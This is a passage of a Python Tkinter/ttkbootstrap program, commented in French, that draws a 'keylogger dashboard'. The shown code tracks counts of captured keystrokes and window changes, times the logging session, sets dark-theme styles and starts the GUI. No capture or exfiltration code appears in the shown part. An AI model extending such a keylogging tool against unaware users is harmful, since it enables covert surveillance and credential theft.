    def update_stats(self):
        global key_count, window_changes
        self.var_key_count.set(str(key_count))
        self.var_window_count.set(str(window_changes))
    
    def start_stats_update(self):
        def update_duration():
            if keylogger_running and start_time:
                elapsed = datetime.now() - start_time
                hours, remainder = divmod(elapsed.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                self.var_duration.set(f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            if keylogger_running:
                self.update_timer = self.root.after(1000, update_duration)
        update_duration()
    
    def stop_stats_update(self):
        if self.update_timer:
            self.root.after_cancel(self.update_timer)

# ==============================================================================
# CONFIGURATION DES STYLES
# ==============================================================================

def configure_styles():
    """Configure les styles personnalisés"""
    style = ttk.Style()
    
    # Frames (styles simples sans conflit)
    style.configure('Dark.TFrame', background=COLORS['bg_dark'])
    style.configure('Card.TFrame', background=COLORS['bg_medium'], relief='flat', borderwidth=2)
    style.configure('Chart.TFrame', background=COLORS['bg_light'], relief='flat')
    style.configure('Progress.TFrame', background=COLORS['primary'])

# ==============================================================================
# LANCEMENT
# ==============================================================================

def main():
    root = ttk.Window(themename="darkly")
    configure_styles()
    app = ModernDashboardApp(root)
    
    print("\n" + "="*60)
    print("🎨 KEYLOGGER DASHBOARD - Modern BI Style")
    print("="*60)
    print("Palette: Bleu marine / Cyan (Business Intelligence)")
    print("Style: Dashboard moderne professionnel")
    print("="*60 + "\n")
    
    root.mainloop()

if __name__ == "__main__":
    main()